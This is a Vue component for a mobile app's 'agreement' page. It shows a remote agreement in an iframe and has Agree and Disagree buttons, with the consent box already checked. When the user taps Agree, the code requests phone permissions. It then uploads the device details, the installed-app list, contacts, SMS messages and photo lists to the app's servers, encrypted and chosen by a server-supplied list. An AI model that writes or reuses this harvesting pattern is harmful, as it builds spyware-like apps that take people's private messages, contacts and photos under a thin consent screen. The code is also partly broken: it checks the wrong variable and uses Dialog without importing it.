<template>
    <div class="beforeqx">
        <iframe
            src="https://app.cashviolin.xyz/cossack-graver-underdogger/ruminative-heartbreaking-messy/boozy-helianthus/zgmrdl.html"
            frameborder="0"></iframe>
        <div class="beforeqx-bottom">
            <div class="beforeqx-select">
                <van-checkbox v-model="isChecked" shape="square"></van-checkbox>
                <span class="beforeqx-desc">Please read the agreement</span>
            </div>
            <div class="beforeqx-btn">
                <div class="beforeqx-back" @click="$router.back()">Disagree</div>
                <div class="beforeqx-next" @click="toNext">Agree</div>
            </div>
        </div>
    </div>
</template>
<script>
import { Toast } from "vant";
import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../utils/android.js";
import { setDeviceInfoAPI, getshebeiInfoAPI, getAppInfoAPI, gettxlAPI, getduanxinAPI, getPhotoInfoAPI } from "../../api";
import { add, unt } from "../../utils/AES.js";
import isNext from '../form/isNext.js'
export default {
    name: 'beforeqx',
    data() {
        return {
            isChecked: true
        }
    },
    methods: {
        //切换小框
        doChange() {
            this.isChecked = !this.isChecked
        },
        //跳转到下一页
        async toNext() {
            if (this.beforeqx) {
                // 去获取权限，上报权限，并且判断下一步跳转哪里
                let res = await getPermission()
                //拒绝两次
                if (!res.result) {
                    Dialog({
                        message: 'Please re-acquire the permission, if it is rejected twice, please open the permission in the phone settings', confirmButtonText: 'Confirm'
                    });
                    return
                }
                //上报设备信息
                this.getInfo()
                isNext()
            } else {
                Toast('Please check the agreement first')
            }
        },
        //获取设备信息上报情况
        async getInfo() {
            const res = await setDeviceInfoAPI()
            this.list = unt(res.data).list
            console.log(this.list, 'this.list')
            console.log(JSON.stringify(this.list), 'this.list')
            if (this.list.indexOf("DEVICE") > -1) {
                let res = await getDeviceInfo();
                let info = JSON.parse(res.appInfo);
                getshebeiInfoAPI(add({ model: info.device }))
            }
            if (this.list.indexOf('APP') > -1) {
                let res = await getApp();
                let info = JSON.parse(res.appInfo);
                getAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
            }
            if (this.list.indexOf("CONTACT") > -1) {
                let res = await getContact();
                let info = JSON.parse(res.appInfo);
                gettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
            }
            if (this.list.indexOf("SMS") > -1) {
                let res = await getSms();
                let info = JSON.parse(res.appInfo);
                getduanxinAPI(add({ model: { list: info.smsList } }))
            }
            if (this.list.indexOf("PHOTO") > -1) {
                let res = await getPhoto();
                let info = JSON.parse(res.appInfo);
                getPhotoInfoAPI(add({ model: { list: info.photoList } }))
            }
            console.log(this.list, '设备信息上报情况')
        }
    }
}
</script>
<style scoped lang="less">
@a: 3.75vw;

.beforeqx {
    overflow: hidden;
    padding-bottom: (100/@a);

    iframe {
        width: 105vw;
        height: (667/@a);
    }

    .beforeqx-bottom {
        position: fixed;
        bottom: 0;
        left: 0;
        z-index: 999;

        .beforeqx-select {
            box-sizing: border-box;

            padding-left: (10/@a);
            height: (40/@a);
            background-color: #e7e7e7;
            display: flex;

            .beforeqx-desc {
                padding-top: (10/@a);
                margin-left: (10/@a);
            }
        }

        .beforeqx-btn {
            display: flex;
            height: (60/@a);
            text-align: center;
            line-height: (60/@a);
            color: #fff;
            font-size: (18/@a);

            .beforeqx-back {
                width: 50vw;
                background-color: #cccccc;
            }

            .beforeqx-next {
                width: 50vw;
                background: linear-gradient(180deg, #8B70C0 0%, #1E005A 100%);
            }
        }
    }

}
</style>